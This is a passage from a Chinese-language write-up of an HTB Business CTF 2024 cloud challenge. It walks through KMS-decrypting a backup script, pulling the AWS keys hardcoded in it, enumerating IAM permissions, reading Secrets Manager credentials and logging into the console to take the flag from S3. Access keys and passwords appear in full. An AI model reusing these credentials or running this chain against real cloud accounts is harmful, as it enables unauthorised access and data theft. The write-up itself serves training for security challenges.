aws_secret_access_key = tcjyvVvTU6wCpSy7o10BEBTIewfcKu1JRnRN4cSI
aws_session_token = IQoJb3JpZ2lu....
```

`aws kms list-keys` 发现有两个 key，然后一个个看

```bash
aws kms describe-key --key-id
```

发现有一个能用，通过描述得知用于加密解密，用这个来解密 backup.ps1.enc

```bash
aws kms decrypt --ciphertext-blob fileb://./backup.ps1.enc --key-id 038c41d9-b337-43fe-a0a3-6d622bb7131d
```

得到 base64 编码后的脚本，解码即可拿到

```powershell
Import-Module AWSPowerShell

$accessKey = "AKIAXYAFLIG2NPAE4BAQ"
$secretKey = "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"

$secretName = ""
$secret = Get-AWSSecretValue -SecretId $secretName
$secretJson = ConvertFrom-Json $secret.SecretString
$accessKey = $secretJson.accessKey
$secretKey = $secretJson.secretKey
Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey

Set-DefaultAWSRegion -Region YOUR_AWS_REGION

$instanceId = "vault11-ws"

$volumeId = (Get-EC2Instance -InstanceId $instanceId).Instances.BlockDeviceMappings | Where-Object { $_.DeviceName -eq "/dev/sda1" } | Select-Object -ExpandProperty Ebs | Select-Object -ExpandProperty VolumeId
Write-Host "Creating snapshot of root volume for EC2 instance $instanceId..."
$snapshot = New-EC2Snapshot -VolumeId $volumeId -Description "Backup snapshot for EC2 instance $instanceId"

Write-Host "Snapshot created successfully."
Write-Host "Snapshot ID: $($snapshot.SnapshotId)"

Clear-AWSCredentials
```

枚举一下权限

```bash
> python3.11 enumerate-iam.py --access-key AKIAXYAFLIG2NPAE4BAQ --secret-key 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

2024-05-27 08:52:08,757 - 15716 - [INFO] Starting permission enumeration for access-key-id "AKIAXYAFLIG2NPAE4BAQ"
2024-05-27 08:52:10,297 - 15716 - [INFO] -- Account ARN : arn:aws:iam::532587168180:user/vaultmanager
2024-05-27 08:52:10,297 - 15716 - [INFO] -- Account Id  : 532587168180
2024-05-27 08:52:10,297 - 15716 - [INFO] -- Account Path: user/vaultmanager
2024-05-27 08:52:10,529 - 15716 - [INFO] Attempting common-service describe / list brute force.
2024-05-27 08:52:25,555 - 15716 - [INFO] -- dynamodb.describe_endpoints() worked!
2024-05-27 08:52:29,497 - 15716 - [INFO] -- secretsmanager.list_secrets() worked!
```

这个 ps 脚本用来备份快照的，不过它并没有备份快照的权限，也没有查看实例权限，反而只有一个查看 secret 权限（有点生草，不能创建快照可以理解，毕竟防止参赛者乱来）

能 `secretsmanager.list_secrets` 

```bash
> aws secretsmanager list-secrets

{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:532587168180:secret:AWSVault11-gd6Hq8",
            "Name": "AWSVault11",
            "LastChangedDate": "2024-05-07T21:11:13.505000+08:00",
            "LastAccessedDate": "2024-05-07T08:00:00+08:00",
            "SecretVersionsToStages": {
                "terraform-20240507123751892900000003": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2024-05-07T20:37:51.318000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:532587168180:secret:AWSVault11-dev-lYByRs",
            "Name": "AWSVault11-dev",
            "LastChangedDate": "2024-05-07T22:07:20.991000+08:00",
            "LastAccessedDate": "2024-05-25T08:00:00+08:00",
            "SecretVersionsToStages": {
                "terraform-20240507140720756700000004": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2024-05-07T22:07:20.232000+08:00"
        }
    ]
}
```

尝试读每一个

```bash
> aws secretsmanager describe-secret --secret-id AWSVault11

An error occurred (AccessDeniedException) when calling the DescribeSecret operation: User: arn:aws:iam::532587168180:user/vaultmanager is not authorized to perform: secretsmanager:DescribeSecret on resource: AWSVault11 because no identity-based policy allows the secretsmanager:DescribeSecret action

> aws secretsmanager describe-secret --secret-id AWSVault11-dev
{
    "ARN": "arn:aws:secretsmanager:us-east-1:532587168180:secret:AWSVault11-dev-lYByRs",
    "Name": "AWSVault11-dev",
    "LastChangedDate": "2024-05-07T22:07:20.991000+08:00",
    "LastAccessedDate": "2024-05-25T08:00:00+08:00",
    "VersionIdsToStages": {
        "terraform-20240507140720756700000004": [
            "AWSCURRENT"
        ]
    },
    "CreatedDate": "2024-05-07T22:07:20.232000+08:00"
}

> aws secretsmanager get-secret-value --secret-id AWSVault11

An error occurred (AccessDeniedException) when calling the GetSecretValue operation: User: arn:aws:iam::532587168180:user/vaultmanager is not authorized to perform: secretsmanager:GetSecretValue on resource: AWSVault11 because no identity-based policy allows the secretsmanager:GetSecretValue action
```

然后 AWSVault11-dev 这个能读，拿到了用户名密码

```bash
> aws secretsmanager get-secret-value --secret-id AWSVault11-dev
{
    "ARN": "arn:aws:secretsmanager:us-east-1:532587168180:secret:AWSVault11-dev-lYByRs",
    "Name": "AWSVault11-dev",
    "VersionId": "terraform-20240507140720756700000004",
    "SecretString": "{\"password\":\"DoYouFeelitNow1!?\",\"username\":\"kstone\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2024-05-07T22:07:20.985000+08:00"
}
```

然后，这个用户名密码能登 AWS 控制台….

账户 ID 就是 ARN 里的账户 ID

![Untitled](image/2024-05-28/Untitled%208.png)

访问 s3 去拿一开始我们访问不到的 flag

![Untitled](image/2024-05-28/Untitled%209.png)

依次点进 flag.txt，在点下载或者打开

![Untitled](image/2024-05-28/Untitled%2010.png)

就能拿到 flag了

![Untitled](image/2024-05-28/Untitled%2011.png)

> HTB{W15D0M_15_5uFF3R1Ng_kA1_d3n_aGaP1_aF70}
> 

## Reference

1. [https://github.com/hackthebox/business-ctf-2024/tree/main/cloud](https://github.com/hackthebox/business-ctf-2024/tree/main/cloud) 官方 WriteUp
2. [IAM 标识符 - AWS Identity and Access Management (amazon.com)](https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_identifiers.html#identifiers-unique-ids)
3. [workdocs — AWS CLI 2.15.58 Command Reference (amazonaws.com)](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/workdocs/index.html)
4. [使用 IAM 用户凭证连接到 Amazon WorkDocs 并查询用户 - Amazon WorkDocs](https://docs.aws.amazon.com/zh_cn/workdocs/latest/developerguide/connect-workdocs-iam.html)
5. [Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments (gitlab.com)](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/#modifying-the-metadata)
6. [服务账号的类型  |  IAM 文档  |  Google Cloud](https://cloud.google.com/iam/docs/service-account-types?hl=zh-cn#user-managed)
7. [gcloud auth activate-service-account  |  Google Cloud CLI Documentation](https://cloud.google.com/sdk/gcloud/reference/auth/activate-service-account)
8. [gcloud storage ls  |  Google Cloud CLI Documentation](https://cloud.google.com/sdk/gcloud/reference/storage/ls)
9. [速看！没有比这更全面的 Firebase 介绍！ (webeye.com)](https://cloud.webeye.com/tech-blog/su-kan-mei-you-bi-zhe-geng-quan-mian-de-firebase-jie-shao.html)
10. [Firestore  |  Firebase (google.com)](https://firebase.google.com/docs/firestore)
11. [@firebase/firestore  |  Firebase JavaScript API reference (google.com)](https://firebase.google.com/docs/reference/js/firestore_.md#getfirestore)
12. [Firestore - Documentation (googleapis.dev)](https://googleapis.dev/nodejs/firestore/latest/Firestore.html)
13. [Export and import data  |  Firestore  |  Firebase (google.com)](https://firebase.google.com/docs/firestore/manage-data/export-import#gcloud)
14. [steadyequipment/node-firestore-backup: Google Firebase Firestore backup tool (github.com)](https://github.com/steadyequipment/node-firestore-backup)
15. [describe-snapshots — AWS CLI 2.15.58 Command Reference (amazonaws.com)](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/describe-snapshots.html)
16. [libguestfs, library for accessing and modifying VM disk images](https://libguestfs.org/)
17. [Invoke-WebRequest (Microsoft.PowerShell.Utility) - PowerShell | Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4)